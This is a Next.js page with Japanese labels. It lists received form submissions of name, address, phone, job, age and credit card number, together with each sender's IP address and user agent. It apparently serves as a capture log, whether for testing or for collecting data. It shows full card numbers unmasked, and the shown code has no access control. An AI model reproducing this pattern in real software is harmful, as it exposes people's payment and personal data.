import Link from "next/link";
import { readRecords } from "@/app/lib/storage";

export const runtime = "nodejs";
export const dynamic = "force-dynamic";

function truncate(text: string, max = 160) {
  if (text.length <= max) return text;
  return `${text.slice(0, max)}...`;
}

export default async function HistoryPage() {
  const records = await readRecords();

  return (
    <div className="page">
      <div className="shell">
        <div className="header">
          <div>
            <div className="pill">受信履歴</div>
            <div className="title">入力内容の一覧</div>
            <p className="muted">最新200件までを記録しています。Cloud Run再起動後はクリアされます。</p>
          </div>
          <Link className="secondaryButton linkButton" href="/">
            入力フォームへ戻る
          </Link>
        </div>

        <div className="card">
          {records.length === 0 ? (
            <div className="empty">まだ受信履歴がありません。</div>
          ) : (
            <div className="tableWrapper">
              <table className="table">
                <thead>
                  <tr>
                    <th>時刻</th>
                    <th>氏名 / 住所 / 電話 / 職業 / 年齢 / カード</th>
                    <th>送信元</th>
                    <th>生テキスト</th>
                  </tr>
                </thead>
                <tbody>
                  {records.map((r) => (
                    <tr key={r.id}>
                      <td>
                        <div>{new Date(r.createdAt).toLocaleString("ja-JP", { timeZone: "Asia/Tokyo" })}</div>
                      </td>
                      <td>
                        <div><strong>氏名:</strong> {r.name || "-"}</div>
                        <div><strong>住所:</strong> {r.address || "-"}</div>
                        <div><strong>電話:</strong> {r.phone || "-"}</div>
                        <div><strong>職業:</strong> {r.job || "-"}</div>
                        <div><strong>年齢:</strong> {r.age || "-"}</div>
                        <div><strong>カード:</strong> {r.creditCard || "-"}</div>
                      </td>
                      <td>
                        <div className="badge">{r.sourceIp || "unknown"}</div>
                        <div className="muted" style={{ marginTop: 6 }}>{truncate(r.userAgent || "", 80) || "UAなし"}</div>
                      </td>
                      <td className="rawText">{truncate(r.rawText || "", 260) || "-"}</td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
